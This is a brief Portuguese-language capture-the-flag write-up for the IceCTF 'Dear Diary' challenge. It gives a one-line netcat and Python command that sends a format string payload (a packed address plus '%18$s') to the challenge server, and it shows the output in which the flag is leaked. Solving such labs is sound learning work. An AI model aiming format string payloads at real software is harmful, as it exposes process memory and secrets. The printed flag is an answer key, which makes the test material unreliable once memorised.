# Dear Diary

O desafio se tratava de um format string, sem entrar em maiores detalhes a respeito da falha, segue a resolução

```
greyhound//deadcow ~/fun/icectf/dear_diary % nc diary.vuln.icec.tf 6501 <<< $(python -c 'print "1\n"+"\xa0\xa0\x04\x08"+"%18$s"+"\n2\n3\n"')
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets:
1. add entry
2. print latest entry
3. quit
> IceCTF{this_thing_is_just_sitting_here}


1. add entry
2. print latest entry
3. quit
>
greyhound//deadcow ~/fun/icectf/dear_diary %
```
